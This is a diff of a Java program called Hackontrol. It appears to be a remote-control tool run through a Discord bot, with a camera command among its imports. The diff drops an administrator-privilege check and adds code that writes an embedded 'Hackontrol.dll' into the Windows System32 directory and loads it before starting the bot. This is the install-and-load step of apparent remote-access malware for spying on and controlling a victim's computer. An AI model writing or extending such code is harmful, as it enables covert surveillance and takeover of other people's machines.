@@ -2,14 +2,12 @@ package com.khopan.hackontrol;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.PrintStream;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.Random;
-import java.util.prefs.Preferences;
 
 import com.khopan.hackontrol.command.CameraCommand;
 import com.khopan.hackontrol.command.Command;
@@ -132,11 +130,6 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
-		if(!Hackontrol.hasAdministratorPrivileges()) {
-			System.exit(1);
-			return;
-		}
-
 		String windowsDirectoryPath = System.getenv("windir");
 
 		if(windowsDirectoryPath == null) {
@@ -158,8 +151,16 @@ public class Hackontrol {
 			return;
 		}
 
+		File win32Library = new File(system32Directory, "win32c.dll");
+		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
 		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
-		Win32Library.setCopyLibraryPath(libraryFile.getAbsolutePath());
+		InputStream stream = Hackontrol.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
+		byte[] data = stream.readAllBytes();
+		stream.close();
+		FileOutputStream output = new FileOutputStream(libraryFile);
+		output.write(data);
+		output.close();
+		System.load(libraryFile.getAbsolutePath());
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
@@ -279,32 +280,6 @@ public class Hackontrol {
 		}
 
 		return false;
-	}
-
-	// https://stackoverflow.com/a/23538961/17136195
-	private static boolean hasAdministratorPrivileges() {
-		Preferences preferences = Preferences.systemRoot();
-
-		synchronized(System.err) {
-			PrintStream error = System.err;
-			System.setErr(new PrintStream(new OutputStream() {
-				@Override
-				public void write(int data) {
-
-				}
-			}));
-
-			try {
-				preferences.put("foo", "bar"); // SecurityException on Windows
-				preferences.remove("foo");
-				preferences.flush(); // BackingStoreException on Linux
-				return true;
-			} catch(Exception Exception) {
-				return false;
-			} finally {
-				System.setErr(error);
-			}
-		}
 	}
 
 	private class Listener extends ListenerAdapter {
